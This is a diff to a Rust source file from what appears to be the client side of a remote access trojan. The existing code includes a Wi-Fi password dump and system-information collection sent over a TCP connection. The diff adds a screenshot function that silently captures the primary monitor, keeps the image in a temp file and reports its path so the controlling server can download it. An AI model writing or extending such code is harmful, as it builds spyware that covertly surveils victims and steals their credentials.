@@ -1,9 +1,10 @@
-use rfd::MessageDialog;
 use shared::{
     BoxLevel, ClientMessage, DiskInformation, Display, HardwareInformation, MemoryInformation, OsInformation, Privilege, ProcessInformation, SystemInformation, WifiPasswords, utils::send_message
 };
 use std::net::TcpStream;
-
+use rfd::MessageDialog;
+use xcap::Monitor;
+use tempfile::Builder;
 use sysinfo::{Disks, System};
 
 // ---- sysInfo ---------------------------
@@ -269,3 +270,59 @@ pub fn wifidump(conn: &mut TcpStream) -> Result<bool, String> {
 }
 
 // ---- WifiDump ---------------------------
+
+// ---- Screenshot ---------------------------
+
+pub fn screenshot(conn: &mut TcpStream) -> Result<bool, String> {
+    // Get all monitors
+    let monitors = match Monitor::all(){
+        Ok(t) => t,
+        Err(e) => {
+            let _ = send_message(conn, &ClientMessage::Error(e.to_string()));
+            return Ok(true);
+        }
+    };
+    // Get primary monitor
+    let monitor = match monitors.into_iter().find(|m| m.is_primary().unwrap()){
+        Some(m) => m,
+        None => {
+            let _ = send_message(conn, &ClientMessage::Error("Primary monitor not found".to_string()));
+            return Ok(true);
+        }
+    };
+
+    // Capture image
+    let image = match monitor.capture_image() {
+        Ok(i) => i,
+        Err(e) => {
+            let _ = send_message(conn, &ClientMessage::Error(e.to_string()));
+            return Ok(true);
+        }
+    };
+
+    // Get tempfile
+    
+    let path = match Builder::new().prefix("tmp").suffix(".png").tempfile().map_err(|e| e.to_string())?.into_temp_path().keep() {
+        Ok(t) => t,
+        Err(e) => {
+            let _ = send_message(conn, &ClientMessage::Error(e.to_string()));
+            return Ok(true);
+        }
+    };
+    
+    // Save image
+    match image.save(&path) {
+        Ok(t) => t,
+        Err(e) => {
+            let _ = send_message(conn, &ClientMessage::Error(e.to_string()));
+            return Ok(true);
+        }
+    }
+
+    let s = path.to_string_lossy().to_string();
+    let _ = send_message(conn, &ClientMessage::Screenshot(s));
+    Ok(true)
+    // We finish here cause the server automatically is going to send "download /path/to/tempfile"
+}
+
+// ---- Screenshot ---------------------------
